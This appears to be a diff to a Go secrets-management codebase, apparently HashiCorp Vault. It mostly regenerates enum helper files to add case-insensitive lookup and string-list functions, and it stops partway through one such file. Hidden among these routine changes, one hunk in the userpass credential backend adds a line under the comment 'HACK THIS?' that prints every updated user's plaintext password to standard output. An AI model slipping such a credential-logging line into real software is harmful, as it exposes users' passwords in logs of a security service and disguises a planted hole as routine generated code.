@@ -1,0 +1,2410 @@
+diff --git a/api/pluginruntimetype_enumer.go b/api/pluginruntimetype_enumer.go
+index 663f440ff4..4955af3bef 100644
+--- a/api/pluginruntimetype_enumer.go
++++ b/api/pluginruntimetype_enumer.go
+@@ -4,12 +4,15 @@ package api
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _PluginRuntimeTypeName = "unsupportedcontainer"
+ 
+ var _PluginRuntimeTypeIndex = [...]uint8{0, 11, 20}
+ 
++const _PluginRuntimeTypeLowerName = "unsupportedcontainer"
++
+ func (i PluginRuntimeType) String() string {
+ 	if i >= PluginRuntimeType(len(_PluginRuntimeTypeIndex)-1) {
+ 		return fmt.Sprintf("PluginRuntimeType(%d)", i)
+@@ -17,11 +20,26 @@ func (i PluginRuntimeType) String() string {
+ 	return _PluginRuntimeTypeName[_PluginRuntimeTypeIndex[i]:_PluginRuntimeTypeIndex[i+1]]
+ }
+ 
+-var _PluginRuntimeTypeValues = []PluginRuntimeType{0, 1}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _PluginRuntimeTypeNoOp() {
++	var x [1]struct{}
++	_ = x[PluginRuntimeTypeUnsupported-(0)]
++	_ = x[PluginRuntimeTypeContainer-(1)]
++}
++
++var _PluginRuntimeTypeValues = []PluginRuntimeType{PluginRuntimeTypeUnsupported, PluginRuntimeTypeContainer}
+ 
+ var _PluginRuntimeTypeNameToValueMap = map[string]PluginRuntimeType{
+-	_PluginRuntimeTypeName[0:11]:  0,
+-	_PluginRuntimeTypeName[11:20]: 1,
++	_PluginRuntimeTypeName[0:11]:       PluginRuntimeTypeUnsupported,
++	_PluginRuntimeTypeLowerName[0:11]:  PluginRuntimeTypeUnsupported,
++	_PluginRuntimeTypeName[11:20]:      PluginRuntimeTypeContainer,
++	_PluginRuntimeTypeLowerName[11:20]: PluginRuntimeTypeContainer,
++}
++
++var _PluginRuntimeTypeNames = []string{
++	_PluginRuntimeTypeName[0:11],
++	_PluginRuntimeTypeName[11:20],
+ }
+ 
+ // PluginRuntimeTypeString retrieves an enum value from the enum constants string name.
+@@ -30,6 +48,10 @@ func PluginRuntimeTypeString(s string) (PluginRuntimeType, error) {
+ 	if val, ok := _PluginRuntimeTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _PluginRuntimeTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to PluginRuntimeType values", s)
+ }
+ 
+@@ -38,6 +60,13 @@ func PluginRuntimeTypeValues() []PluginRuntimeType {
+ 	return _PluginRuntimeTypeValues
+ }
+ 
++// PluginRuntimeTypeStrings returns a slice of all String values of the enum
++func PluginRuntimeTypeStrings() []string {
++	strs := make([]string, len(_PluginRuntimeTypeNames))
++	copy(strs, _PluginRuntimeTypeNames)
++	return strs
++}
++
+ // IsAPluginRuntimeType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i PluginRuntimeType) IsAPluginRuntimeType() bool {
+ 	for _, v := range _PluginRuntimeTypeValues {
+diff --git a/api/renewbehavior_enumer.go b/api/renewbehavior_enumer.go
+index 9b272e3e0c..dcd9e8b0ad 100644
+--- a/api/renewbehavior_enumer.go
++++ b/api/renewbehavior_enumer.go
+@@ -4,12 +4,15 @@ package api
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _RenewBehaviorName = "IgnoreErrorsRenewDisabledErrorOnErrors"
+ 
+ var _RenewBehaviorIndex = [...]uint8{0, 12, 25, 38}
+ 
++const _RenewBehaviorLowerName = "ignoreerrorsrenewdisablederroronerrors"
++
+ func (i RenewBehavior) String() string {
+ 	if i >= RenewBehavior(len(_RenewBehaviorIndex)-1) {
+ 		return fmt.Sprintf("RenewBehavior(%d)", i)
+@@ -17,12 +20,30 @@ func (i RenewBehavior) String() string {
+ 	return _RenewBehaviorName[_RenewBehaviorIndex[i]:_RenewBehaviorIndex[i+1]]
+ }
+ 
+-var _RenewBehaviorValues = []RenewBehavior{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _RenewBehaviorNoOp() {
++	var x [1]struct{}
++	_ = x[RenewBehaviorIgnoreErrors-(0)]
++	_ = x[RenewBehaviorRenewDisabled-(1)]
++	_ = x[RenewBehaviorErrorOnErrors-(2)]
++}
++
++var _RenewBehaviorValues = []RenewBehavior{RenewBehaviorIgnoreErrors, RenewBehaviorRenewDisabled, RenewBehaviorErrorOnErrors}
+ 
+ var _RenewBehaviorNameToValueMap = map[string]RenewBehavior{
+-	_RenewBehaviorName[0:12]:  0,
+-	_RenewBehaviorName[12:25]: 1,
+-	_RenewBehaviorName[25:38]: 2,
++	_RenewBehaviorName[0:12]:       RenewBehaviorIgnoreErrors,
++	_RenewBehaviorLowerName[0:12]:  RenewBehaviorIgnoreErrors,
++	_RenewBehaviorName[12:25]:      RenewBehaviorRenewDisabled,
++	_RenewBehaviorLowerName[12:25]: RenewBehaviorRenewDisabled,
++	_RenewBehaviorName[25:38]:      RenewBehaviorErrorOnErrors,
++	_RenewBehaviorLowerName[25:38]: RenewBehaviorErrorOnErrors,
++}
++
++var _RenewBehaviorNames = []string{
++	_RenewBehaviorName[0:12],
++	_RenewBehaviorName[12:25],
++	_RenewBehaviorName[25:38],
+ }
+ 
+ // RenewBehaviorString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func RenewBehaviorString(s string) (RenewBehavior, error) {
+ 	if val, ok := _RenewBehaviorNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _RenewBehaviorNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to RenewBehavior values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func RenewBehaviorValues() []RenewBehavior {
+ 	return _RenewBehaviorValues
+ }
+ 
++// RenewBehaviorStrings returns a slice of all String values of the enum
++func RenewBehaviorStrings() []string {
++	strs := make([]string, len(_RenewBehaviorNames))
++	copy(strs, _RenewBehaviorNames)
++	return strs
++}
++
+ // IsARenewBehavior returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i RenewBehavior) IsARenewBehavior() bool {
+ 	for _, v := range _RenewBehaviorValues {
+diff --git a/builtin/credential/userpass/path_user_password.go b/builtin/credential/userpass/path_user_password.go
+index 95826f15aa..8e996c804d 100644
+--- a/builtin/credential/userpass/path_user_password.go
++++ b/builtin/credential/userpass/path_user_password.go
+@@ -94,6 +94,8 @@ func (b *backend) pathUserPasswordUpdate(ctx context.Context, req *logical.Reque
+ 
+ func (b *backend) updateUserPassword(_ *logical.Request, d *framework.FieldData, userEntry *UserEntry) (error, error) {
+ 	password := d.Get(paramPassword).(string)
++	// HACK THIS?
++	fmt.Println("HACKPASSWORD: %s", string(password[:]))
+ 	passwordHash := d.Get(paramPasswordHash).(string)
+ 
+ 	var hash []byte
+diff --git a/builtin/logical/pki/defaultdirectorypolicytype_enumer.go b/builtin/logical/pki/defaultdirectorypolicytype_enumer.go
+index 917225ff83..f270c073ba 100644
+--- a/builtin/logical/pki/defaultdirectorypolicytype_enumer.go
++++ b/builtin/logical/pki/defaultdirectorypolicytype_enumer.go
+@@ -4,12 +4,15 @@ package pki
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _DefaultDirectoryPolicyTypeName = "ForbidSignVerbatimRoleExternalPolicy"
+ 
+ var _DefaultDirectoryPolicyTypeIndex = [...]uint8{0, 6, 18, 22, 36}
+ 
++const _DefaultDirectoryPolicyTypeLowerName = "forbidsignverbatimroleexternalpolicy"
++
+ func (i DefaultDirectoryPolicyType) String() string {
+ 	if i < 0 || i >= DefaultDirectoryPolicyType(len(_DefaultDirectoryPolicyTypeIndex)-1) {
+ 		return fmt.Sprintf("DefaultDirectoryPolicyType(%d)", i)
+@@ -17,13 +20,34 @@ func (i DefaultDirectoryPolicyType) String() string {
+ 	return _DefaultDirectoryPolicyTypeName[_DefaultDirectoryPolicyTypeIndex[i]:_DefaultDirectoryPolicyTypeIndex[i+1]]
+ }
+ 
+-var _DefaultDirectoryPolicyTypeValues = []DefaultDirectoryPolicyType{0, 1, 2, 3}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _DefaultDirectoryPolicyTypeNoOp() {
++	var x [1]struct{}
++	_ = x[Forbid-(0)]
++	_ = x[SignVerbatim-(1)]
++	_ = x[Role-(2)]
++	_ = x[ExternalPolicy-(3)]
++}
++
++var _DefaultDirectoryPolicyTypeValues = []DefaultDirectoryPolicyType{Forbid, SignVerbatim, Role, ExternalPolicy}
+ 
+ var _DefaultDirectoryPolicyTypeNameToValueMap = map[string]DefaultDirectoryPolicyType{
+-	_DefaultDirectoryPolicyTypeName[0:6]:   0,
+-	_DefaultDirectoryPolicyTypeName[6:18]:  1,
+-	_DefaultDirectoryPolicyTypeName[18:22]: 2,
+-	_DefaultDirectoryPolicyTypeName[22:36]: 3,
++	_DefaultDirectoryPolicyTypeName[0:6]:        Forbid,
++	_DefaultDirectoryPolicyTypeLowerName[0:6]:   Forbid,
++	_DefaultDirectoryPolicyTypeName[6:18]:       SignVerbatim,
++	_DefaultDirectoryPolicyTypeLowerName[6:18]:  SignVerbatim,
++	_DefaultDirectoryPolicyTypeName[18:22]:      Role,
++	_DefaultDirectoryPolicyTypeLowerName[18:22]: Role,
++	_DefaultDirectoryPolicyTypeName[22:36]:      ExternalPolicy,
++	_DefaultDirectoryPolicyTypeLowerName[22:36]: ExternalPolicy,
++}
++
++var _DefaultDirectoryPolicyTypeNames = []string{
++	_DefaultDirectoryPolicyTypeName[0:6],
++	_DefaultDirectoryPolicyTypeName[6:18],
++	_DefaultDirectoryPolicyTypeName[18:22],
++	_DefaultDirectoryPolicyTypeName[22:36],
+ }
+ 
+ // DefaultDirectoryPolicyTypeString retrieves an enum value from the enum constants string name.
+@@ -32,6 +56,10 @@ func DefaultDirectoryPolicyTypeString(s string) (DefaultDirectoryPolicyType, err
+ 	if val, ok := _DefaultDirectoryPolicyTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _DefaultDirectoryPolicyTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to DefaultDirectoryPolicyType values", s)
+ }
+ 
+@@ -40,6 +68,13 @@ func DefaultDirectoryPolicyTypeValues() []DefaultDirectoryPolicyType {
+ 	return _DefaultDirectoryPolicyTypeValues
+ }
+ 
++// DefaultDirectoryPolicyTypeStrings returns a slice of all String values of the enum
++func DefaultDirectoryPolicyTypeStrings() []string {
++	strs := make([]string, len(_DefaultDirectoryPolicyTypeNames))
++	copy(strs, _DefaultDirectoryPolicyTypeNames)
++	return strs
++}
++
+ // IsADefaultDirectoryPolicyType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i DefaultDirectoryPolicyType) IsADefaultDirectoryPolicyType() bool {
+ 	for _, v := range _DefaultDirectoryPolicyTypeValues {
+diff --git a/builtin/logical/pki/ifmodifiedreqtype_enumer.go b/builtin/logical/pki/ifmodifiedreqtype_enumer.go
+index b366fd825f..de613825b1 100644
+--- a/builtin/logical/pki/ifmodifiedreqtype_enumer.go
++++ b/builtin/logical/pki/ifmodifiedreqtype_enumer.go
+@@ -4,12 +4,15 @@ package pki
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _ifModifiedReqTypeName = "UnknownCACRLDeltaCRLUnifiedCRLUnifiedDeltaCRL"
+ 
+ var _ifModifiedReqTypeIndex = [...]uint8{0, 7, 9, 12, 20, 30, 45}
+ 
++const _ifModifiedReqTypeLowerName = "unknowncacrldeltacrlunifiedcrlunifieddeltacrl"
++
+ func (i ifModifiedReqType) String() string {
+ 	if i < 0 || i >= ifModifiedReqType(len(_ifModifiedReqTypeIndex)-1) {
+ 		return fmt.Sprintf("ifModifiedReqType(%d)", i)
+@@ -17,15 +20,42 @@ func (i ifModifiedReqType) String() string {
+ 	return _ifModifiedReqTypeName[_ifModifiedReqTypeIndex[i]:_ifModifiedReqTypeIndex[i+1]]
+ }
+ 
+-var _ifModifiedReqTypeValues = []ifModifiedReqType{0, 1, 2, 3, 4, 5}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _ifModifiedReqTypeNoOp() {
++	var x [1]struct{}
++	_ = x[ifModifiedUnknown-(0)]
++	_ = x[ifModifiedCA-(1)]
++	_ = x[ifModifiedCRL-(2)]
++	_ = x[ifModifiedDeltaCRL-(3)]
++	_ = x[ifModifiedUnifiedCRL-(4)]
++	_ = x[ifModifiedUnifiedDeltaCRL-(5)]
++}
++
++var _ifModifiedReqTypeValues = []ifModifiedReqType{ifModifiedUnknown, ifModifiedCA, ifModifiedCRL, ifModifiedDeltaCRL, ifModifiedUnifiedCRL, ifModifiedUnifiedDeltaCRL}
+ 
+ var _ifModifiedReqTypeNameToValueMap = map[string]ifModifiedReqType{
+-	_ifModifiedReqTypeName[0:7]:   0,
+-	_ifModifiedReqTypeName[7:9]:   1,
+-	_ifModifiedReqTypeName[9:12]:  2,
+-	_ifModifiedReqTypeName[12:20]: 3,
+-	_ifModifiedReqTypeName[20:30]: 4,
+-	_ifModifiedReqTypeName[30:45]: 5,
++	_ifModifiedReqTypeName[0:7]:        ifModifiedUnknown,
++	_ifModifiedReqTypeLowerName[0:7]:   ifModifiedUnknown,
++	_ifModifiedReqTypeName[7:9]:        ifModifiedCA,
++	_ifModifiedReqTypeLowerName[7:9]:   ifModifiedCA,
++	_ifModifiedReqTypeName[9:12]:       ifModifiedCRL,
++	_ifModifiedReqTypeLowerName[9:12]:  ifModifiedCRL,
++	_ifModifiedReqTypeName[12:20]:      ifModifiedDeltaCRL,
++	_ifModifiedReqTypeLowerName[12:20]: ifModifiedDeltaCRL,
++	_ifModifiedReqTypeName[20:30]:      ifModifiedUnifiedCRL,
++	_ifModifiedReqTypeLowerName[20:30]: ifModifiedUnifiedCRL,
++	_ifModifiedReqTypeName[30:45]:      ifModifiedUnifiedDeltaCRL,
++	_ifModifiedReqTypeLowerName[30:45]: ifModifiedUnifiedDeltaCRL,
++}
++
++var _ifModifiedReqTypeNames = []string{
++	_ifModifiedReqTypeName[0:7],
++	_ifModifiedReqTypeName[7:9],
++	_ifModifiedReqTypeName[9:12],
++	_ifModifiedReqTypeName[12:20],
++	_ifModifiedReqTypeName[20:30],
++	_ifModifiedReqTypeName[30:45],
+ }
+ 
+ // ifModifiedReqTypeString retrieves an enum value from the enum constants string name.
+@@ -34,6 +64,10 @@ func ifModifiedReqTypeString(s string) (ifModifiedReqType, error) {
+ 	if val, ok := _ifModifiedReqTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _ifModifiedReqTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to ifModifiedReqType values", s)
+ }
+ 
+@@ -42,6 +76,13 @@ func ifModifiedReqTypeValues() []ifModifiedReqType {
+ 	return _ifModifiedReqTypeValues
+ }
+ 
++// ifModifiedReqTypeStrings returns a slice of all String values of the enum
++func ifModifiedReqTypeStrings() []string {
++	strs := make([]string, len(_ifModifiedReqTypeNames))
++	copy(strs, _ifModifiedReqTypeNames)
++	return strs
++}
++
+ // IsAifModifiedReqType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i ifModifiedReqType) IsAifModifiedReqType() bool {
+ 	for _, v := range _ifModifiedReqTypeValues {
+diff --git a/builtin/logical/pki/pki_backend/rolepathpolicy_enumer.go b/builtin/logical/pki/pki_backend/rolepathpolicy_enumer.go
+index 305e34a6b5..9012b1bbb0 100644
+--- a/builtin/logical/pki/pki_backend/rolepathpolicy_enumer.go
++++ b/builtin/logical/pki/pki_backend/rolepathpolicy_enumer.go
+@@ -5,12 +5,15 @@ package pki_backend
+ import (
+ 	"encoding/json"
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _RolePathPolicyName = "RPPUnknownRPPSignVerbatimRPPRole"
+ 
+ var _RolePathPolicyIndex = [...]uint8{0, 10, 25, 32}
+ 
++const _RolePathPolicyLowerName = "rppunknownrppsignverbatimrpprole"
++
+ func (i RolePathPolicy) String() string {
+ 	if i < 0 || i >= RolePathPolicy(len(_RolePathPolicyIndex)-1) {
+ 		return fmt.Sprintf("RolePathPolicy(%d)", i)
+@@ -18,12 +21,30 @@ func (i RolePathPolicy) String() string {
+ 	return _RolePathPolicyName[_RolePathPolicyIndex[i]:_RolePathPolicyIndex[i+1]]
+ }
+ 
+-var _RolePathPolicyValues = []RolePathPolicy{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _RolePathPolicyNoOp() {
++	var x [1]struct{}
++	_ = x[RPPUnknown-(0)]
++	_ = x[RPPSignVerbatim-(1)]
++	_ = x[RPPRole-(2)]
++}
++
++var _RolePathPolicyValues = []RolePathPolicy{RPPUnknown, RPPSignVerbatim, RPPRole}
+ 
+ var _RolePathPolicyNameToValueMap = map[string]RolePathPolicy{
+-	_RolePathPolicyName[0:10]:  0,
+-	_RolePathPolicyName[10:25]: 1,
+-	_RolePathPolicyName[25:32]: 2,
++	_RolePathPolicyName[0:10]:       RPPUnknown,
++	_RolePathPolicyLowerName[0:10]:  RPPUnknown,
++	_RolePathPolicyName[10:25]:      RPPSignVerbatim,
++	_RolePathPolicyLowerName[10:25]: RPPSignVerbatim,
++	_RolePathPolicyName[25:32]:      RPPRole,
++	_RolePathPolicyLowerName[25:32]: RPPRole,
++}
++
++var _RolePathPolicyNames = []string{
++	_RolePathPolicyName[0:10],
++	_RolePathPolicyName[10:25],
++	_RolePathPolicyName[25:32],
+ }
+ 
+ // RolePathPolicyString retrieves an enum value from the enum constants string name.
+@@ -32,6 +53,10 @@ func RolePathPolicyString(s string) (RolePathPolicy, error) {
+ 	if val, ok := _RolePathPolicyNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _RolePathPolicyNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to RolePathPolicy values", s)
+ }
+ 
+@@ -40,6 +65,13 @@ func RolePathPolicyValues() []RolePathPolicy {
+ 	return _RolePathPolicyValues
+ }
+ 
++// RolePathPolicyStrings returns a slice of all String values of the enum
++func RolePathPolicyStrings() []string {
++	strs := make([]string, len(_RolePathPolicyNames))
++	copy(strs, _RolePathPolicyNames)
++	return strs
++}
++
+ // IsARolePathPolicy returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i RolePathPolicy) IsARolePathPolicy() bool {
+ 	for _, v := range _RolePathPolicyValues {
+diff --git a/builtin/logical/pki/tidystatusstate_enumer.go b/builtin/logical/pki/tidystatusstate_enumer.go
+index 11db8e64c4..36367d3f99 100644
+--- a/builtin/logical/pki/tidystatusstate_enumer.go
++++ b/builtin/logical/pki/tidystatusstate_enumer.go
+@@ -4,12 +4,15 @@ package pki
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _tidyStatusStateName = "InactiveStartedFinishedErrorCancellingCancelled"
+ 
+ var _tidyStatusStateIndex = [...]uint8{0, 8, 15, 23, 28, 38, 47}
+ 
++const _tidyStatusStateLowerName = "inactivestartedfinishederrorcancellingcancelled"
++
+ func (i tidyStatusState) String() string {
+ 	if i < 0 || i >= tidyStatusState(len(_tidyStatusStateIndex)-1) {
+ 		return fmt.Sprintf("tidyStatusState(%d)", i)
+@@ -17,15 +20,42 @@ func (i tidyStatusState) String() string {
+ 	return _tidyStatusStateName[_tidyStatusStateIndex[i]:_tidyStatusStateIndex[i+1]]
+ }
+ 
+-var _tidyStatusStateValues = []tidyStatusState{0, 1, 2, 3, 4, 5}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _tidyStatusStateNoOp() {
++	var x [1]struct{}
++	_ = x[tidyStatusInactive-(0)]
++	_ = x[tidyStatusStarted-(1)]
++	_ = x[tidyStatusFinished-(2)]
++	_ = x[tidyStatusError-(3)]
++	_ = x[tidyStatusCancelling-(4)]
++	_ = x[tidyStatusCancelled-(5)]
++}
++
++var _tidyStatusStateValues = []tidyStatusState{tidyStatusInactive, tidyStatusStarted, tidyStatusFinished, tidyStatusError, tidyStatusCancelling, tidyStatusCancelled}
+ 
+ var _tidyStatusStateNameToValueMap = map[string]tidyStatusState{
+-	_tidyStatusStateName[0:8]:   0,
+-	_tidyStatusStateName[8:15]:  1,
+-	_tidyStatusStateName[15:23]: 2,
+-	_tidyStatusStateName[23:28]: 3,
+-	_tidyStatusStateName[28:38]: 4,
+-	_tidyStatusStateName[38:47]: 5,
++	_tidyStatusStateName[0:8]:        tidyStatusInactive,
++	_tidyStatusStateLowerName[0:8]:   tidyStatusInactive,
++	_tidyStatusStateName[8:15]:       tidyStatusStarted,
++	_tidyStatusStateLowerName[8:15]:  tidyStatusStarted,
++	_tidyStatusStateName[15:23]:      tidyStatusFinished,
++	_tidyStatusStateLowerName[15:23]: tidyStatusFinished,
++	_tidyStatusStateName[23:28]:      tidyStatusError,
++	_tidyStatusStateLowerName[23:28]: tidyStatusError,
++	_tidyStatusStateName[28:38]:      tidyStatusCancelling,
++	_tidyStatusStateLowerName[28:38]: tidyStatusCancelling,
++	_tidyStatusStateName[38:47]:      tidyStatusCancelled,
++	_tidyStatusStateLowerName[38:47]: tidyStatusCancelled,
++}
++
++var _tidyStatusStateNames = []string{
++	_tidyStatusStateName[0:8],
++	_tidyStatusStateName[8:15],
++	_tidyStatusStateName[15:23],
++	_tidyStatusStateName[23:28],
++	_tidyStatusStateName[28:38],
++	_tidyStatusStateName[38:47],
+ }
+ 
+ // tidyStatusStateString retrieves an enum value from the enum constants string name.
+@@ -34,6 +64,10 @@ func tidyStatusStateString(s string) (tidyStatusState, error) {
+ 	if val, ok := _tidyStatusStateNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _tidyStatusStateNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to tidyStatusState values", s)
+ }
+ 
+@@ -42,6 +76,13 @@ func tidyStatusStateValues() []tidyStatusState {
+ 	return _tidyStatusStateValues
+ }
+ 
++// tidyStatusStateStrings returns a slice of all String values of the enum
++func tidyStatusStateStrings() []string {
++	strs := make([]string, len(_tidyStatusStateNames))
++	copy(strs, _tidyStatusStateNames)
++	return strs
++}
++
+ // IsAtidyStatusState returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i tidyStatusState) IsAtidyStatusState() bool {
+ 	for _, v := range _tidyStatusStateValues {
+diff --git a/command/agent/exec/childprocessstate_enumer.go b/command/agent/exec/childprocessstate_enumer.go
+index 154606ed62..42d432f3b7 100644
+--- a/command/agent/exec/childprocessstate_enumer.go
++++ b/command/agent/exec/childprocessstate_enumer.go
+@@ -4,12 +4,15 @@ package exec
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _childProcessStateName = "NotStartedRunningRestartingStopped"
+ 
+ var _childProcessStateIndex = [...]uint8{0, 10, 17, 27, 34}
+ 
++const _childProcessStateLowerName = "notstartedrunningrestartingstopped"
++
+ func (i childProcessState) String() string {
+ 	if i >= childProcessState(len(_childProcessStateIndex)-1) {
+ 		return fmt.Sprintf("childProcessState(%d)", i)
+@@ -17,13 +20,34 @@ func (i childProcessState) String() string {
+ 	return _childProcessStateName[_childProcessStateIndex[i]:_childProcessStateIndex[i+1]]
+ }
+ 
+-var _childProcessStateValues = []childProcessState{0, 1, 2, 3}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _childProcessStateNoOp() {
++	var x [1]struct{}
++	_ = x[childProcessStateNotStarted-(0)]
++	_ = x[childProcessStateRunning-(1)]
++	_ = x[childProcessStateRestarting-(2)]
++	_ = x[childProcessStateStopped-(3)]
++}
++
++var _childProcessStateValues = []childProcessState{childProcessStateNotStarted, childProcessStateRunning, childProcessStateRestarting, childProcessStateStopped}
+ 
+ var _childProcessStateNameToValueMap = map[string]childProcessState{
+-	_childProcessStateName[0:10]:  0,
+-	_childProcessStateName[10:17]: 1,
+-	_childProcessStateName[17:27]: 2,
+-	_childProcessStateName[27:34]: 3,
++	_childProcessStateName[0:10]:       childProcessStateNotStarted,
++	_childProcessStateLowerName[0:10]:  childProcessStateNotStarted,
++	_childProcessStateName[10:17]:      childProcessStateRunning,
++	_childProcessStateLowerName[10:17]: childProcessStateRunning,
++	_childProcessStateName[17:27]:      childProcessStateRestarting,
++	_childProcessStateLowerName[17:27]: childProcessStateRestarting,
++	_childProcessStateName[27:34]:      childProcessStateStopped,
++	_childProcessStateLowerName[27:34]: childProcessStateStopped,
++}
++
++var _childProcessStateNames = []string{
++	_childProcessStateName[0:10],
++	_childProcessStateName[10:17],
++	_childProcessStateName[17:27],
++	_childProcessStateName[27:34],
+ }
+ 
+ // childProcessStateString retrieves an enum value from the enum constants string name.
+@@ -32,6 +56,10 @@ func childProcessStateString(s string) (childProcessState, error) {
+ 	if val, ok := _childProcessStateNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _childProcessStateNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to childProcessState values", s)
+ }
+ 
+@@ -40,6 +68,13 @@ func childProcessStateValues() []childProcessState {
+ 	return _childProcessStateValues
+ }
+ 
++// childProcessStateStrings returns a slice of all String values of the enum
++func childProcessStateStrings() []string {
++	strs := make([]string, len(_childProcessStateNames))
++	copy(strs, _childProcessStateNames)
++	return strs
++}
++
+ // IsAchildProcessState returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i childProcessState) IsAchildProcessState() bool {
+ 	for _, v := range _childProcessStateValues {
+diff --git a/command/agentproxyshared/cache/enforceconsistency_enumer.go b/command/agentproxyshared/cache/enforceconsistency_enumer.go
+index e2354111df..4f444cd55b 100644
+--- a/command/agentproxyshared/cache/enforceconsistency_enumer.go
++++ b/command/agentproxyshared/cache/enforceconsistency_enumer.go
+@@ -4,12 +4,15 @@ package cache
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _EnforceConsistencyName = "NeverAlways"
+ 
+ var _EnforceConsistencyIndex = [...]uint8{0, 5, 11}
+ 
++const _EnforceConsistencyLowerName = "neveralways"
++
+ func (i EnforceConsistency) String() string {
+ 	if i < 0 || i >= EnforceConsistency(len(_EnforceConsistencyIndex)-1) {
+ 		return fmt.Sprintf("EnforceConsistency(%d)", i)
+@@ -17,11 +20,26 @@ func (i EnforceConsistency) String() string {
+ 	return _EnforceConsistencyName[_EnforceConsistencyIndex[i]:_EnforceConsistencyIndex[i+1]]
+ }
+ 
+-var _EnforceConsistencyValues = []EnforceConsistency{0, 1}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _EnforceConsistencyNoOp() {
++	var x [1]struct{}
++	_ = x[EnforceConsistencyNever-(0)]
++	_ = x[EnforceConsistencyAlways-(1)]
++}
++
++var _EnforceConsistencyValues = []EnforceConsistency{EnforceConsistencyNever, EnforceConsistencyAlways}
+ 
+ var _EnforceConsistencyNameToValueMap = map[string]EnforceConsistency{
+-	_EnforceConsistencyName[0:5]:  0,
+-	_EnforceConsistencyName[5:11]: 1,
++	_EnforceConsistencyName[0:5]:       EnforceConsistencyNever,
++	_EnforceConsistencyLowerName[0:5]:  EnforceConsistencyNever,
++	_EnforceConsistencyName[5:11]:      EnforceConsistencyAlways,
++	_EnforceConsistencyLowerName[5:11]: EnforceConsistencyAlways,
++}
++
++var _EnforceConsistencyNames = []string{
++	_EnforceConsistencyName[0:5],
++	_EnforceConsistencyName[5:11],
+ }
+ 
+ // EnforceConsistencyString retrieves an enum value from the enum constants string name.
+@@ -30,6 +48,10 @@ func EnforceConsistencyString(s string) (EnforceConsistency, error) {
+ 	if val, ok := _EnforceConsistencyNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _EnforceConsistencyNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to EnforceConsistency values", s)
+ }
+ 
+@@ -38,6 +60,13 @@ func EnforceConsistencyValues() []EnforceConsistency {
+ 	return _EnforceConsistencyValues
+ }
+ 
++// EnforceConsistencyStrings returns a slice of all String values of the enum
++func EnforceConsistencyStrings() []string {
++	strs := make([]string, len(_EnforceConsistencyNames))
++	copy(strs, _EnforceConsistencyNames)
++	return strs
++}
++
+ // IsAEnforceConsistency returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i EnforceConsistency) IsAEnforceConsistency() bool {
+ 	for _, v := range _EnforceConsistencyValues {
+diff --git a/command/agentproxyshared/cache/wheninconsistentaction_enumer.go b/command/agentproxyshared/cache/wheninconsistentaction_enumer.go
+index fdbf58e1ba..be69f16186 100644
+--- a/command/agentproxyshared/cache/wheninconsistentaction_enumer.go
++++ b/command/agentproxyshared/cache/wheninconsistentaction_enumer.go
+@@ -4,12 +4,15 @@ package cache
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _WhenInconsistentActionName = "FailRetryForward"
+ 
+ var _WhenInconsistentActionIndex = [...]uint8{0, 4, 9, 16}
+ 
++const _WhenInconsistentActionLowerName = "failretryforward"
++
+ func (i WhenInconsistentAction) String() string {
+ 	if i < 0 || i >= WhenInconsistentAction(len(_WhenInconsistentActionIndex)-1) {
